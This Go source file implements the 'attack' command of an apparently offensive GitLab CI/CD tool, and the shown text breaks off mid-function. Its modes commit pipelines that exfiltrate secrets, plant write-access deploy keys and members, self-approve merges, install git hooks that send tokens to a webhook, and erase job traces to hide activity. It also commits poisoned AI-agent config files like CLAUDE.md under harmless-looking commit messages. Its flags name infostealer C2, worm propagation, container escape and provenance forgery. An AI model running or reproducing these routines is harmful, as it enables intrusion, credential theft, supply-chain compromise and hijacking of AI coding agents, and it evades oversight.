package cmd

import (
	"context"
	"crypto/x509"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"maps"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	rorpkg "github.com/mr-pmillz/gogatoz/pkg/attack/ror"
	"github.com/mr-pmillz/gogatoz/pkg/attack/scriptinject"
	secdump "github.com/mr-pmillz/gogatoz/pkg/attack/secretsdump"
	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/mr-pmillz/gogatoz/pkg/pipeline"
	"github.com/mr-pmillz/gogatoz/pkg/pivot"
	"github.com/spf13/cobra"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

const (
	payloadPwnRequest        = "pwn-request"
	payloadRor               = "ror"
	payloadRunnerOnRunner    = "runner-on-runner"
	payloadRunnerOnRunnerAlt = "runneronrunner"
	payloadNestedRunner      = "nested-runner"
)

// Flags for attack command
var (
	atkTarget      string
	atkBranch      string
	atkMessage     string
	atkAuthorName  string
	atkAuthorEmail string
	// CI content sources (exactly one when committing CI)
	atkCIInline string
	atkCIFile   string
	atkCIStdin  bool
	// Modes
	atkCommitCI bool
	atkSecrets  bool // run secrets exfil attack mode (commits pipeline)
	atkCleanup  bool // cleanup mode (remove branch/CI, revoke keys, remove member)
	// Discovery / targeting
	atkDiscoverTags bool
	atkExecutor     string
	// Payload generation (local rendering or as CI source)
	atkPayload     string // ror-shell | pwn-request | ror | runner-on-runner | secrets | secrets-exfil
	atkPayloadOnly bool
	// Common payload options
	atkJobName         string
	atkStage           string
	atkTags            string // comma-separated
	atkImage           string
	atkManual          bool
	atkArtifactsPath   string
	atkArtifactsExpire string
	// Staging / deconflict options
	atkDeconflict string // fail|suffix|force
	// ror-shell specific
	atkCmd      string
	atkDownload string
	// pwn-request specific
	atkTargetBranchRegex string
	// runner-on-runner specific
	atkScriptURL string
	atkOS        string
	atkKeepAlive int
	// nested-runner specific
	atkNestedGitLabURL string
	atkNestedRegToken  string
	atkNestedName      string
	atkNestedTags      string
	atkNestedExecutor  string
	atkNestedCallback  string
	atkNestedVersion   string
	// secrets exfil specific
	atkWebhook     string
	atkPubkeyFile  string
	atkPrivkeyFile string
	atkExfilMethod string
	atkExfilTarget string
	atkNoWait      bool
	atkAllVars     bool
	atkWaitTimeout time.Duration
	// secrets API dump options
	atkWithProjVars     bool
	atkWithGroupVars    bool
	atkGroupID          string
	atkIncludeProtected bool
	// secrets logs scraping options
	atkLogs             bool
	atkLogsRef          string
	atkLogsMaxPipelines int
	atkLogsMaxJobs      int
	// secrets artifacts scraping options
	atkArtifacts             bool
	atkArtifactsRef          string
	atkArtifactsMaxPipelines int
	atkArtifactsMaxJobs      int
	atkArtifactsMaxZipBytes  int64
	atkArtifactsMaxFileBytes int
	// Persistence modes
	atkDeployKey  bool
	atkKeyTitle   string
	atkKeyPath    string
	atkAddMember  bool
	atkMemberUser string
	atkMemberRole string
	// Cleanup action flags
	atkCleanupBranch     string
	atkCleanupCI         bool
	atkRevokeDeployKey   int64
	atkRemoveMemberID    int64
	atkCleanupPipeline   int64 // delete a specific pipeline by ID
	atkCleanupJobs       bool  // erase all job traces on recent pipelines
	atkCleanupJobsRef    string
	atkCleanupJobsMax    int
	atkCleanupJobsDelete bool // also delete the pipelines after erasing jobs
	// MR creation flags (used with --commit-ci or --ai-inject)
	atkCreateMR       bool
	atkMRTitle        string
	atkMRDescription  string
	atkMRTargetBranch string
	// AI injection mode
	atkAIInject     bool
	atkAIConfigFile string
	atkAIPrompt     string
	atkAIPromptFile string
	// Script injection mode (workflow hopping)
	atkInjectScript      bool
	atkScriptPath        string
	atkScriptPayload     string
	atkScriptPayloadFile string
	atkScriptPrepend     bool // prepend (default) vs append
	atkTriggerPipeline   bool // trigger pipeline after injection
	// Auto-merge mode (supply chain)
	atkAutoMerge       bool
	atkAutoMergeFile   string // file to modify (default: README.md)
	atkAutoMergeRemove bool   // remove source branch after merge
	// git-hook payload options
	atkHookType string // post-checkout, post-merge, pre-push
	// cache-poison payload options
	atkCacheKey  string
	atkCachePath string
	atkPoisonCmd string
	// tamper modes
	atkTamperRelease bool   // tamper with a release
	atkTamperPackage bool   // tamper with a package
	atkTagName       string // release tag name
	atkReleaseName   string // new release name
	atkReleaseDesc   string // new release description
	atkLinkName      string // release link name to replace
	atkLinkURL       string // new URL for replaced link
	atkAddLinkName   string // name of link to add
	atkAddLinkURL    string // URL of link to add
	atkPackageName   string // package name for tamper
	atkPackageVer    string // package version for tamper
	atkPackageFile   string // local file to upload as package
	// harvest mode
	atkHarvest        bool   // token harvest mode
	atkHarvestListen  string // listen address for harvest callback
	atkHarvestTimeout string // harvest timeout duration
	// tamper-tag mode (Trivy-style supply chain attack)
	atkTamperTag            bool   // tag poisoning mode
	atkTamperTagFile        string // file to replace in the tagged commit tree
	atkTamperTagPayload     string // inline payload content for replaced file
	atkTamperTagPayloadFile string // read replacement file content from local file
	atkTamperTagSource      string // source ref to base the new commit tree on
	atkTamperTagC2          string // C2 URL for auto-generated infostealer payload
	atkTamperTagEncKey      string // AES encryption key for infostealer exfil data
	atkTamperTagRSAPubFile  string // RSA-4096 public key PEM file for hybrid encryption
	atkTamperTagBackup      string // backup exfil git repo URL for infostealer
	atkTamperTagOriginal    bool   // append original file content after payload (stealth)
	atkTamperTagProcScan    bool   // scan /proc/*/environ for secrets from parallel processes
	atkTamperTagMemDump     bool   // attempt runner worker memory extraction
	atkTamperTagExtended    bool   // extended credential sweep (crypto wallets, shell history, etc.)
	// LOTP injection mode (Living off the Pipeline)
	atkLOTPInject bool   // commit weaponized LOTP config to branch
	atkLOTPTool   string // target tool: npm-gyp, npm, make, pytest, goreleaser, gradle, terraform
	// ROR shell listener mode (built-in callback server for ror-shell exfil)
	atkRorListen        bool   // start a built-in listener for ror-shell exfil callbacks
	atkRorListenAddr    string // listen address (default ":9444")
	atkRorListenTimeout string // timeout for listening (default "10m")
	// Memory dump mode (extract secrets from runner process memory via /proc)
	atkMemoryDump       bool
	atkMemoryDumpProc   string // /proc/<pid> to dump (auto-detect if empty)
	atkMemoryDumpFilter string // regex to filter variables (default: .*SECRET|.*TOKEN|.*KEY)
	// Supply chain worm mode (self-propagating CI injection)
	atkSupplyChainWorm bool
	atkWormPayload     string // payload to inject into sibling repos
	atkWormMaxRepos    int    // max sibling repos to propagate to (default: 5)
	atkWormTargetGroup string // group ID/path to scope worm propagation
	// Container escape mode (privileged Docker executor exploit)
	atkContainerEscape bool
	atkEscapeMountPath string // host path to mount (default: /)
	atkEscapeMethod    string // sshd|docker|kernel|nsenter (default: sshd)
	atkEscapeCommand   string // command to execute on host (default: bash)
	// Variable injection mode (CI/Group variable takeover)
	atkVariableInject  bool
	atkInjectVars      string // JSON string of var key=value pairs to inject
	atkInjectScope     string // project|group (default: project)
	atkInjectGroupID   string // group ID for group-scope injection
	atkInjectProtected bool   // inject as protected variable
	atkInjectMasked    bool   // inject as masked variable
	// C2 covert channel mode (DNS tunnel, steganography, ICMP)
	atkC2Channel     bool
	atkC2Method      string // dns-a|dns-txt|steg-wav|steg-png|icmp (default: dns-a)
	atkC2Target      string // domain/URL for the C2 channel
	atkC2KeepAlive   bool   // keep C2 channel alive with heartbeats
	atkC2CallbackURL string // C2 callback URL
	// npm tamper mode (supply chain npm package poisoning)
	atkNpmTamper       bool
	atkNpmRegistry     string // npm registry URL
	atkNpmPackage      string // specific package to tamper
	atkNpmInjectScript string // preinstall hook content
	// Vault enumeration mode (HashiCorp Vault secrets sweep)
	atkVaultEnum       bool
	atkVaultAddr       string // Vault server URL
	atkVaultAuthMethod string // token|kubernetes|aws
	// K8s secrets sweep mode (Kubernetes RBAC exploit)
	atkK8sSecrets    bool
	atkK8sNamespaces string // comma-separated namespaces
	// Dead Man's Switch mode (persistence with revocation detection)
	atkDeadManSwitch bool
	atkDMSMonitorURL string // endpoint to probe
	atkDMSInterval   string // check interval seconds
	atkDMSTTL        string // TTL before self-removal
	atkDMSHandler    string // command on revocation
	atkDMSPlatform   string // linux|macos
	// Branch mutator mode (mass branch CI poisoning)
	atkBranchMutator      bool
	atkMutatorFile        string // file to create/update on each branch
	atkMutatorContent     string // content to write
	atkMutatorMaxBranches int    // max branches to target
	// Sigstore provenance forgery mode
	atkSigstore        bool
	atkSigstorePackage string // package name for attestation
	atkSigstoreVersion string // package version
	// Shared co-author trailer
	atkCoAuthor string // co-authored-by trailer for commits
)

// narrow interface to allow test fakes
type attackRunner interface {
	CommitCIPipeline(ctx context.Context, projectID any, branch, yamlContent, message string) (string, error)
}

type secretsRunner interface {
	RunExfil(ctx context.Context, projectID any, branch, pubkey string, runnerTags []string, exfil attack.ExfilOptions) (url, jobName string, err error)
}

var newAttacker = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) attackRunner {
	return attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
}

var newSecretsRunner = func(gl *gitlabx.Client, baseURL, authorName, authorEmail string, timeout time.Duration) secretsRunner {
	att := attack.NewAttacker(gl, baseURL, authorName, authorEmail, timeout)
	return attack.NewSecretsAttack(att)
}

// Output structure for --secrets mode when --output-json is set.
type secretsOutput struct {
	PipelineURL      string                    `json:"pipeline_url"`
	JobID            int64                     `json:"job_id,omitempty"`
	JobStatus        string                    `json:"job_status,omitempty"`
	ExfilSecrets     map[string]string         `json:"exfil_secrets,omitempty"`
	ProjectVariables []secdump.Variable        `json:"project_variables,omitempty"`
	GroupVariables   []secdump.Variable        `json:"group_variables,omitempty"`
	LogFindings      []secdump.Finding         `json:"log_findings,omitempty"`
	ArtifactFindings []secdump.ArtifactFinding `json:"artifact_findings,omitempty"`
}

// ensureBranchDeconflict picks a branch name according to strategy and performs deletions for force.
func ensureBranchDeconflict(ctx context.Context, client *gitlabx.Client, projectID any, desired, strategy, authorName, authorEmail string) (string, error) {
	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), authorName, authorEmail, 0)
	name := strings.TrimSpace(desired)
	if name == "" {
		name = gogatozAttack
	} //nolint:goconst
	st := strings.ToLower(strings.TrimSpace(strategy))
	if st == "" {
		st = "suffix"
	}
	exists, err := att.BranchExists(ctx, projectID, name)
	if err != nil {
		return "", err
	}
	switch st {
	case "fail":
		if exists {
			return "", fmt.Errorf("branch %s already exists (use --deconflict)", name)
		}
		return name, nil
	case "force":
		if exists {
			if err := att.DeleteBranch(ctx, projectID, name); err != nil {
				return "", fmt.Errorf("delete branch: %w", err)
			}
		}
		return name, nil
	case "suffix":
		if !exists {
			return name, nil
		}
		for i := 1; i <= 99; i++ {
			cand := fmt.Sprintf("%s-%d", name, i)
			e, err := att.BranchExists(ctx, projectID, cand)
			if err != nil {
				return "", err
			}
			if !e {
				return cand, nil
			}
		}
		return "", fmt.Errorf("could not find available suffix for %s", name)
	default:
		return "", fmt.Errorf("unknown --deconflict strategy: %s", strategy)
	}
}

var attackCmd = &cobra.Command{
	Use:   "attack",
	Short: "Run attack workflows against a target GitLab project",
	Long:  "Attack modes allow committing CI pipelines or other actions to validate or exploit misconfigurations.",
	RunE: func(cmd *cobra.Command, args []string) error {
		// New: payload-only path prints YAML/JSON and exits; no token/target required
		if atkPayloadOnly {
			if strings.TrimSpace(atkPayload) == "" {
				return fmt.Errorf("--payload is required when --payload-only is set")
			}
			// LOTP payloads use a different output format (JSON with file paths)
			lp := strings.ToLower(strings.TrimSpace(atkPayload))
			if strings.HasPrefix(lp, "lotp-") || lp == "gyp" {
				lotpTool := strings.TrimPrefix(lp, "lotp-")
				if lotpTool == lp { // no lotp- prefix; must be "gyp"
					lotpTool = lp
				}
				if strings.TrimSpace(atkCmd) == "" {
					return fmt.Errorf("--cmd is required for LOTP payloads")
				}
				p, perr := payloadgen.GenerateLOTPPayload(lotpTool, atkCmd)
				if perr != nil {
					return fmt.Errorf("generate LOTP payload: %w", perr)
				}
				type fileOut struct {
					Path    string `json:"path"`
					Content string `json:"content"`
				}
				out := struct {
					Tool        string    `json:"tool"`
					Files       []fileOut `json:"files"`
					Description string    `json:"description"`
					Reference   string    `json:"reference"`
				}{
					Tool:        p.Tool,
					Description: p.Description,
					Reference:   p.Reference,
				}
				for _, f := range p.Files {
					out.Files = append(out.Files, fileOut{Path: f.Path, Content: f.Content})
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			yaml, err := renderPayload()
			if err != nil {
				return err
			}
			_, err = fmt.Fprint(cmd.OutOrStdout(), yaml)
			return err
		}

		if token == "" {
			return fmt.Errorf("GitLab token is required. Provide --token or set GITLAB_TOKEN")
		}
		if strings.TrimSpace(atkTarget) == "" {
			return fmt.Errorf("--target is required (project ID or path-with-namespace)")
		}
		// Mode selection: exactly one of the attack modes (unless discovery or payload-only)
		if !atkDiscoverTags {
			modes := 0
			if atkCommitCI {
				modes++
			}
			if atkSecrets {
				modes++
			}
			if atkCleanup {
				modes++
			}
			if atkDeployKey {
				modes++
			}
			if atkAddMember {
				modes++
			}
			if atkAIInject {
				modes++
			}
			if atkInjectScript {
				modes++
			}
			if atkAutoMerge {
				modes++
			}
			if atkTamperRelease {
				modes++
			}
			if atkTamperPackage {
				modes++
			}
			if atkHarvest {
				modes++
			}
			if atkTamperTag {
				modes++
			}
			if atkLOTPInject {
				modes++
			}
			if atkRorListen {
				modes++
			}
			if atkMemoryDump {
				modes++
			}
			if atkSupplyChainWorm {
				modes++
			}
			if atkContainerEscape {
				modes++
			}
			if atkVariableInject {
				modes++
			}
			if atkC2Channel {
				modes++
			}
			if atkNpmTamper {
				modes++
			}
			if atkVaultEnum {
				modes++
			}
			if atkK8sSecrets {
				modes++
			}
			if atkDeadManSwitch {
				modes++
			}
			if atkBranchMutator {
				modes++
			}
			if atkSigstore {
				modes++
			}
			if modes != 1 {
				return fmt.Errorf("select exactly one mode: --commit-ci, --secrets, --cleanup, --deploy-key, --add-member, --ai-inject, --inject-script, --lotp-inject, --auto-merge, --tamper-release, --tamper-package, --tamper-tag, --harvest, --ror-listen, --memory-dump, --supply-chain-worm, --container-escape, --variable-inject, --c2-channel, --npm-tamper, --vault-enum, --k8s-secrets, --dead-man-switch, --branch-mutator, or --sigstore (or use --payload-only or --discover-tags)")
			}
		}

		// Build client with global knobs (reuse code style from search/enumerate)
		ctx := context.Background()
		clOpts := []gitlabx.Option{gitlabx.WithRateLimit(rateRPS, rateBurst), gitlabx.WithRetry(retryMax)}
		if ua := userAgent; strings.TrimSpace(ua) != "" {
			clOpts = append(clOpts, gitlabx.WithUserAgent(ua))
		}
		var idleTO, tlsTO, expectTO, reqTO time.Duration
		if s := strings.TrimSpace(httpIdleTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-idle-timeout: %w", e)
			} else {
				idleTO = d
			}
		}
		if s := strings.TrimSpace(httpTLSTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-tls-timeout: %w", e)
			} else {
				tlsTO = d
			}
		}
		if s := strings.TrimSpace(httpExpectTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-expect-timeout: %w", e)
			} else {
				expectTO = d
			}
		}
		if s := strings.TrimSpace(httpRequestTimeout); s != "" {
			if d, e := time.ParseDuration(s); e != nil {
				return fmt.Errorf("invalid --http-req-timeout: %w", e)
			} else {
				reqTO = d
			}
		}
		if httpMaxIdle > 0 || httpMaxIdlePerHost > 0 {
			clOpts = append(clOpts, gitlabx.WithHTTPPool(httpMaxIdle, httpMaxIdlePerHost))
		}
		if idleTO > 0 || tlsTO > 0 || expectTO > 0 || reqTO > 0 {
			clOpts = append(clOpts, gitlabx.WithHTTPTimeouts(idleTO, tlsTO, expectTO, reqTO))
		}
		if insecureSkipTLS {
			clOpts = append(clOpts, gitlabx.WithInsecureTLS(true))
		}
		if p := strings.TrimSpace(caCertPath); p != "" {
			pem, err := os.ReadFile(p)
			if err != nil {
				return fmt.Errorf("read --ca-cert: %w", err)
			}
			pool := x509.NewCertPool()
			if !pool.AppendCertsFromPEM(pem) {
				return fmt.Errorf("--ca-cert: no valid PEM certificates found")
			}
			clOpts = append(clOpts, gitlabx.WithRootCAs(pool))
		}
		clOpts = appendSOCKS5Option(clOpts)
		client, err := gitlabx.New(strings.TrimSpace(gitlabURL), token, clOpts...)
		if err != nil {
			return err
		}

		if strings.TrimSpace(atkBranch) == "" {
			atkBranch = gogatozAttack
		}

		// Discovery: list runner tags and exit
		if atkDiscoverTags {
			tags, _, err := rorpkg.DiscoverProjectRunnerTags(ctx, client, atkTarget)
			if err != nil {
				return err
			}
			if strings.TrimSpace(atkExecutor) != "" {
				tags = rorpkg.FilterTagsByExecutor(tags, atkExecutor)
			}
			if outputJSON {
				// print as simple JSON array
				q := make([]string, 0, len(tags))
				for _, t := range tags {
					q = append(q, fmt.Sprintf("%q", t))
				}
				_, err := fmt.Fprintf(cmd.OutOrStdout(), "[%s]\n", strings.Join(q, ", "))
				if err != nil {
					return err
				}
				return nil
			}
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Runner tags: %s", strings.Join(tags, ", ")))
			return nil
		}

		// deploy-key mode: create a deploy key with write access
		if atkDeployKey {
			if strings.TrimSpace(atkKeyPath) == "" {
				return fmt.Errorf("--key-path is required when using --deploy-key")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)
			keyID, pubKey, err := pers.CreateDeployKey(ctx, atkTarget, atkKeyTitle, atkKeyPath)
			if err != nil {
				return err
			}
			if outputJSON {
				b, _ := json.MarshalIndent(struct {
					DeployKeyID    int64  `json:"deploy_key_id"`
					PublicKey      string `json:"public_key"`
					PrivateKeyPath string `json:"private_key_path"`
				}{DeployKeyID: keyID, PublicKey: strings.TrimSpace(pubKey), PrivateKeyPath: atkKeyPath}, "", "  ")
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Deploy key created (ID: %d)", keyID))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Public key: %s", strings.TrimSpace(pubKey)))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Private key saved to: %s", atkKeyPath))
			return nil
		}

		// add-member mode: add a user as project member
		if atkAddMember {
			if strings.TrimSpace(atkMemberUser) == "" {
				return fmt.Errorf("--member-username is required when using --add-member")
			}
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)
			if err := pers.AddProjectMemberByUsername(ctx, atkTarget, atkMemberUser, atkMemberRole); err != nil {
				return err
			}
			role := atkMemberRole
			if role == "" {
				role = "developer"
			}
			if outputJSON {
				b, _ := json.MarshalIndent(struct {
					Username    string `json:"username"`
					AccessLevel string `json:"access_level"`
				}{Username: atkMemberUser, AccessLevel: role}, "", "  ")
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Added %s as %s to project", atkMemberUser, role))
			return nil
		}

		// cleanup mode
		if atkCleanup {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			_, _ = att.SetupUser(ctx)
			type cleanupAction struct {
				Action  string `json:"action"`
				Target  string `json:"target,omitempty"`
				Success bool   `json:"success"`
				Error   string `json:"error,omitempty"`
			}
			var actions []cleanupAction
			// Remove CI file if requested
			if atkCleanupCI {
				branch := strings.TrimSpace(atkBranch)
				if branch == "" {
					branch = gogatozAttack
				}
				err := att.DeleteFile(ctx, atkTarget, branch, ".gitlab-ci.yml", "Remove CI file via GoGatoZ")
				ca := cleanupAction{Action: "delete-ci-file", Target: branch}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Delete branch
			if strings.TrimSpace(atkCleanupBranch) != "" {
				err := att.DeleteBranch(ctx, atkTarget, strings.TrimSpace(atkCleanupBranch))
				ca := cleanupAction{Action: "delete-branch", Target: strings.TrimSpace(atkCleanupBranch)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Revoke deploy key
			if atkRevokeDeployKey > 0 {
				err := att.RevokeDeployKey(ctx, atkTarget, atkRevokeDeployKey)
				ca := cleanupAction{Action: "revoke-deploy-key", Target: fmt.Sprintf("%d", atkRevokeDeployKey)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Remove member by user ID
			if atkRemoveMemberID > 0 {
				err := att.RemoveProjectMember(ctx, atkTarget, atkRemoveMemberID)
				ca := cleanupAction{Action: "remove-member", Target: fmt.Sprintf("%d", atkRemoveMemberID)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Delete a specific pipeline
			if atkCleanupPipeline > 0 {
				err := att.DeletePipeline(ctx, atkTarget, atkCleanupPipeline)
				ca := cleanupAction{Action: "delete-pipeline", Target: fmt.Sprintf("%d", atkCleanupPipeline)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			// Erase job traces (and optionally delete) recent pipelines
			if atkCleanupJobs {
				maxP := atkCleanupJobsMax
				if maxP <= 0 {
					maxP = 5
				}
				count, err := att.EraseRecentPipelines(ctx, atkTarget, atkCleanupJobsRef, maxP, atkCleanupJobsDelete)
				verb := "erase-job-traces"
				if atkCleanupJobsDelete {
					verb = "erase-and-delete-pipelines"
				}
				ca := cleanupAction{Action: verb, Target: fmt.Sprintf("%d pipelines", count)}
				if err != nil {
					ca.Success = false
					ca.Error = err.Error()
				} else {
					ca.Success = true
				}
				actions = append(actions, ca)
			}
			if outputJSON {
				b, err := json.MarshalIndent(struct {
					Actions []cleanupAction `json:"actions"`
				}{Actions: actions}, "", "  ")
				if err != nil {
					return err
				}
				_, err = fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			for _, a := range actions {
				if a.Success {
					renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("%s %s", a.Action, a.Target))
				} else {
					renderError(cmd.OutOrStdout(), fmt.Sprintf("%s %s: %s", a.Action, a.Target, a.Error))
				}
			}
			return nil
		}

		// ai-inject mode: commit a poisoned AI config file
		if atkAIInject {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if err != nil {
				return err
			}
			// Resolve prompt content
			prompt := strings.TrimSpace(atkAIPrompt)
			if prompt == "" && strings.TrimSpace(atkAIPromptFile) != "" {
				b, err := os.ReadFile(strings.TrimSpace(atkAIPromptFile))
				if err != nil {
					return fmt.Errorf("read --ai-prompt-file: %w", err)
				}
				prompt = string(b)
			}
			if prompt == "" {
				prompt = payloadgen.DefaultAIInjectionPrompt()
			}
			configFile := strings.TrimSpace(atkAIConfigFile)
			if configFile == "" {
				configFile = "CLAUDE.md"
			}
			if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
				return err
			}
			if strings.TrimSpace(atkMessage) == "" {
				atkMessage = "docs: update project configuration"
			}
			if err := att.UpsertFile(ctx, atkTarget, finalBranch, configFile, prompt, atkMessage); err != nil {
				return err
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[attack] committed %s to branch %s\n", configFile, finalBranch)

			var mrURL string
			var mrIID int64
			if atkCreateMR {
				mr, mrErr := att.CreateMergeRequest(ctx, atkTarget, finalBranch, atkMRTargetBranch, atkMRTitle, atkMRDescription)
				if mrErr != nil {
					return fmt.Errorf("create merge request: %w", mrErr)
				}
				mrURL = mr.WebURL
				mrIID = mr.IID
				fmt.Fprintf(cmd.ErrOrStderr(), "[attack] merge request: %s\n", mrURL)
			}

			if outputJSON {
				out := struct {
					Branch          string `json:"branch"`
					ConfigFile      string `json:"config_file"`
					MergeRequestURL string `json:"merge_request_url,omitempty"`
					MergeRequestIID int64  `json:"merge_request_iid,omitempty"`
				}{
					Branch:          finalBranch,
					ConfigFile:      configFile,
					MergeRequestURL: mrURL,
					MergeRequestIID: mrIID,
				}
				b, _ := json.MarshalIndent(out, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Committed %s to branch %s", configFile, finalBranch))
			if mrURL != "" {
				renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Merge Request: %s", mrURL))
			}
			return nil
		}

		// auto-merge mode: create MR, self-approve, merge (supply chain attack)
		if atkAutoMerge {
			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			pers := attack.NewPersistence(att)

			// Resolve CI content or use a simple file modification
			filePath := strings.TrimSpace(atkAutoMergeFile)
			if filePath == "" {
				filePath = ".gitlab-ci.yml"
			}
			var content string
			if strings.TrimSpace(atkPayload) != "" {
				var perr error
				content, perr = renderPayload()
				if perr != nil {
					return perr
				}
			} else {
				ci, lerr := loadCIContent(atkCIInline, atkCIFile, atkCIStdin)
				if lerr != nil {
					return lerr
				}
				content = ci
			}
			if strings.TrimSpace(content) == "" {
				return fmt.Errorf("provide content via --ci-yaml, --ci-file, --ci-stdin, or --payload for --auto-merge")
			}

			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			finalBranch, berr := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
			if berr != nil {
				return berr
			}

			msg := strings.TrimSpace(atkMessage)
			if msg == "" {
				msg = "chore: update configuration"
			}
			mrTitle := strings.TrimSpace(atkMRTitle)
			if mrTitle == "" {
				mrTitle = "Update project configuration"
			}

			result, err := pers.RunAutoMerge(ctx, atkTarget,
				finalBranch, filePath, content, msg,
				mrTitle, atkMRDescription, atkMRTargetBranch)
			if err != nil && result == nil {
				return err
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
				return err
			}
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("MR: %s (IID %d)", result.MRURL, result.MRIID))
			renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Approvals required: %d, left: %d", result.Approval.ApprovalsRequired, result.Approval.ApprovalsLeft))
			if result.Approved {
				renderSuccess(cmd.OutOrStdout(), "Self-approved")
			} else if result.ApproveErr != "" {
				renderError(cmd.OutOrStdout(), fmt.Sprintf("Approve failed: %s", result.ApproveErr))
			}
			if result.Merged {
				renderSuccess(cmd.OutOrStdout(), "Merged to default branch")
			} else if result.MergeErr != "" {
				renderError(cmd.OutOrStdout(), fmt.Sprintf("Merge failed: %s", result.MergeErr))
			}
			return nil
		}

		// harvest mode: install git hooks, wait for callbacks, harvest tokens
		if atkHarvest {
			if strings.TrimSpace(atkWebhook) == "" {
				return fmt.Errorf("--webhook is required for --harvest (external URL reachable from runners)")
			}

			att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
			if _, err := att.SetupUser(ctx); err != nil {
				return fmt.Errorf("setup user: %w", err)
			}

			// Build and commit git-hook payload
			var tags []string
			if strings.TrimSpace(atkTags) != "" {
				for t := range strings.SplitSeq(atkTags, ",") {
					t = strings.TrimSpace(t)
					if t != "" {
						tags = append(tags, t)
					}
				}
			}
			hookYAML := payloadgen.GenerateGitHookYAML(payloadgen.GitHookOptions{
				Common: payloadgen.CommonOptions{
					JobName: strings.TrimSpace(atkJobName),
					Tags:    tags,
				},
				CallbackURL: strings.TrimSpace(atkWebhook),
				HookType:    strings.TrimSpace(atkHookType),
			})

			if strings.TrimSpace(atkBranch) == "" {
				atkBranch = attack.GogatozAttacks
			}
			pipelineURL, err := att.CommitCIPipeline(ctx, atkTarget, atkBranch, hookYAML, "Install CI hook via GoGatoZ")
			if err != nil {
				return fmt.Errorf("commit git-hook payload: %w", err)
			}
			fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] git-hook payload committed: %s\n", pipelineURL)
			fmt.Fprintf(cmd.ErrOrStderr(), "[harvest] waiting for callbacks on %s...\n", atkHarvestListen)

			// Parse timeout
			harvestTimeout, terr := time.ParseDuration(atkHarvestTimeout)
			if terr != nil {
				harvestTimeout = 30 * time.Minute
			}

			// Start harvester
			h := pivot.NewHarvester(pivot.HarvestOptions{
				ListenAddr: atkHarvestListen,
				GitLabURL:  strings.TrimSpace(gitlabURL),
				Timeout:    harvestTimeout,
				Progress: func(e pivot.HarvestEvent) {
					if outputJSON {
						return
					}
					switch e.Type {
					case "listening":
						renderInfo(cmd.OutOrStdout(), e.Message)
					case "callback":
						renderInfo(cmd.OutOrStdout(), e.Message)
					case "credential":
						renderSuccess(cmd.OutOrStdout(), e.Message)
					case "error":
						renderError(cmd.OutOrStdout(), e.Message)
					}
				},
			})

			result, err := h.Run(ctx)
			if err != nil {
				return fmt.Errorf("harvest: %w", err)
			}

			if outputJSON {
				b, _ := json.MarshalIndent(result, "", "  ")
				_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
